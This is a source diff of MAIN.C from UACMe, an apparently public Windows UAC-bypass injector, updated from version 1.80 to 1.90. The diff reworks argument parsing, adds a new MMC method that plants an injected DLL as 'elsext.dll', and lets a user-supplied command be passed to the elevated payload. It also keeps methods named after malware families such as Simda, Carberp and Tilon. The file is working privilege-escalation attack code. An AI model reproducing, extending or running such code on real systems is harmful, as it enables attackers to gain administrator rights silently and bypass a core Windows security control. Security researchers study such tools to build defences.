@@ -4,9 +4,9 @@
 *
 *  TITLE:       MAIN.C
 *
-*  VERSION:     1.80
+*  VERSION:     1.90
 *
-*  DATE:        11 July 2015
+*  DATE:        17 Sept 2015
 *
 *  Injector entry point.
 *
@@ -30,6 +30,15 @@
 #include "fubuki32.h"
 #define INJECTDLL Fubuki32
 #define AVRFDLL Hibiki32
+#endif
+
+#if (_MSC_VER >= 1900) 
+#ifdef _DEBUG
+#pragma comment(lib, "vcruntimed.lib")
+#pragma comment(lib, "ucrtd.lib")
+#else
+#pragma comment(lib, "libvcruntime.lib")
+#endif
 #endif
 
 #define PROGRAMTITLE TEXT("UACMe")
@@ -72,15 +81,15 @@ VOID ucmShowMessage(
 VOID main()
 {
 	BOOL                    IsWow64 = FALSE;
-	DWORD                   bytesIO, dwType;
+	DWORD                   bytesIO, dwType, paramLen;
 	WCHAR                   *p;
 	WCHAR                   szBuffer[MAX_PATH + 1];
 	TOKEN_ELEVATION_TYPE    ElevType;
 	RTL_OSVERSIONINFOW      osver;
 
+
 	//query windows version
 	if (!supIsWindowsVersionOrGreater(HIBYTE(_WIN32_WINNT_WIN7), LOBYTE(_WIN32_WINNT_WIN7), 0)) {
-		//also remove Trojan:Win64/Bampeass.A
 		ucmShowMessage(TEXT("This Windows is unsupported."));
 		goto Done;
 	}
@@ -106,93 +115,108 @@ VOID main()
 	dwType = 0;
 	bytesIO = 0;
 	RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
-	if (GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO)) {
+	GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
+	if (bytesIO == 0) {
+		goto Done;
+	}
+	
+	dwType = strtoul(szBuffer);
+	switch (dwType) {
 
-		dwType = strtoul(szBuffer);
-		switch (dwType) {
+	case METHOD_SYSPREP1:
+		OutputDebugString(TEXT("[UCM] Sysprep cryptbase\n\r"));
+		if (osver.dwBuildNumber > 9200) {
+			ucmShowMessage(WINPREBLUE);
+			goto Done;
+		}
+		break;
 
-		case METHOD_SYSPREP1:
-			OutputDebugString(TEXT("[UCM] Sysprep cryptbase\n\r"));
-			if (osver.dwBuildNumber > 9200) {
-				ucmShowMessage(WINPREBLUE);
-				goto Done;
-			}
-			break;
+	case METHOD_SYSPREP2:
+		OutputDebugString(TEXT("[UCM] Sysprep shcore\n\r"));
+		if (osver.dwBuildNumber < 9600) {
+			ucmShowMessage(WINBLUEONLY);
+			goto Done;
+		}
+		break;
 
-		case METHOD_SYSPREP2:
-			OutputDebugString(TEXT("[UCM] Sysprep shcore\n\r"));
-			if (osver.dwBuildNumber < 9600) {
-				ucmShowMessage(WINBLUEONLY);
-				goto Done;
-			}
-			break;
+	case METHOD_SYSPREP3:
+		OutputDebugString(TEXT("[UCM] Sysprep dbgcore\n\r"));
+		if (osver.dwBuildNumber < 10000) {
+			ucmShowMessage(WIN10ONLY);
+			goto Done;
+		}
+		break;
 
-		case METHOD_SYSPREP3:
-			OutputDebugString(TEXT("[UCM] Sysprep dbgcore\n\r"));
-			if (osver.dwBuildNumber < 10000) {
-				ucmShowMessage(WIN10ONLY);
-				goto Done;
-			}
-			break;
+	case METHOD_OOBE:
+		OutputDebugString(TEXT("[UCM] Oobe\n\r"));
+		break;
 
-		case METHOD_OOBE:
-			OutputDebugString(TEXT("[UCM] Oobe\n\r"));
-			break;
-
-		case METHOD_REDIRECTEXE:
-			OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));
+	case METHOD_REDIRECTEXE:
+		OutputDebugString(TEXT("[UCM] AppCompat RedirectEXE\n\r"));
 
 #ifdef _WIN64
-			ucmShowMessage(WOW64WIN32ONLY);
-			goto Done;
+		ucmShowMessage(WOW64WIN32ONLY);
+		goto Done;
 #endif
-			break;
+		break;
 
-		case METHOD_SIMDA:
-			if (osver.dwBuildNumber > 10136) {
-				ucmShowMessage(UAC10FIX);
-				goto Done;
-			}
-			OutputDebugString(TEXT("[UCM] Simda\n\r"));
-			break;
+	case METHOD_SIMDA:
+		if (osver.dwBuildNumber > 10136) {
+			ucmShowMessage(UAC10FIX);
+			goto Done;
+		}
+		OutputDebugString(TEXT("[UCM] Simda\n\r"));
+		break;
 
-		case METHOD_CARBERP:
-			OutputDebugString(TEXT("[UCM] Carberp\n\r"));
-			break;
+	case METHOD_CARBERP:
+		OutputDebugString(TEXT("[UCM] Carberp\n\r"));
+		break;
 
-		case METHOD_CARBERP_EX:
-			OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
-			break;
+	case METHOD_CARBERP_EX:
+		OutputDebugString(TEXT("[UCM] Carberp_ex\n\r"));
+		break;
 
-		case METHOD_TILON:
-			OutputDebugString(TEXT("[UCM] Tilon\n\r"));
-			if (osver.dwBuildNumber > 9200) {
-				ucmShowMessage(WINPREBLUE);
-				goto Done;
-			}
-			break;
+	case METHOD_TILON:
+		OutputDebugString(TEXT("[UCM] Tilon\n\r"));
+		if (osver.dwBuildNumber > 9200) {
+			ucmShowMessage(WINPREBLUE);
+			goto Done;
+		}
+		break;
 
-		case METHOD_AVRF:
-			if (osver.dwBuildNumber > 10136) {
-				ucmShowMessage(UAC10FIX);
-				goto Done;
-			}
-			OutputDebugString(TEXT("[UCM] AVrf\n\r"));
-			break;
+	case METHOD_AVRF:
+		if (osver.dwBuildNumber > 10136) {
+			ucmShowMessage(UAC10FIX);
+			goto Done;
+		}
+		OutputDebugString(TEXT("[UCM] AVrf\n\r"));
+		break;
 
-		case METHOD_WINSAT:
-			OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
-			break;
+	case METHOD_WINSAT:
+		OutputDebugString(TEXT("[UCM] WinSAT\n\r"));
+		break;
 
-		case METHOD_SHIMPATCH:
-			OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));
+	case METHOD_SHIMPATCH:
+		OutputDebugString(TEXT("[UCM] AppCompat Shim Patch\n\r"));
 
 #ifdef _WIN64
-			ucmShowMessage(WOW64WIN32ONLY);
-			goto Done;
+		ucmShowMessage(WOW64WIN32ONLY);
+		goto Done;
 #endif		
-			break;
-			
+		break;
+
+	case METHOD_MMC:
+		OutputDebugString(TEXT("[UCM] MMC \n\r"));
+		break;
+	}
+
+	//prepare command for payload
+	paramLen = 0;
+	RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
+	GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &paramLen);
+	if (paramLen > 0) {
+		if (dwType != METHOD_REDIRECTEXE) {
+			supSetParameter((LPWSTR)&szBuffer, paramLen * sizeof(WCHAR));
 		}
 	}
 
@@ -224,7 +248,7 @@ VOID main()
 #ifndef _WIN64
 	case METHOD_REDIRECTEXE:
 	case METHOD_SHIMPATCH:
-		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
+		if (ucmAppcompatElevation(dwType, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (paramLen != 0) ? szBuffer : NULL )) {
 			OutputDebugString(TEXT("[UCM] AppCompat method called\n\r"));
 		}
 		break;
@@ -311,6 +335,14 @@ VOID main()
 
 		if (ucmWinSATMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL), (osver.dwBuildNumber <= 10136))) {
 			OutputDebugString(TEXT("[UCM] WinSAT method called\n\r"));
+		}
+		break;
+
+	case METHOD_MMC:
+
+		p = L"elsext.dll";
+		if (ucmMMCMethod(p, (CONST PVOID)INJECTDLL, sizeof(INJECTDLL))) {
+			OutputDebugString(TEXT("[UCM] MMC method called\n\r"));
 		}
 		break;
 	}
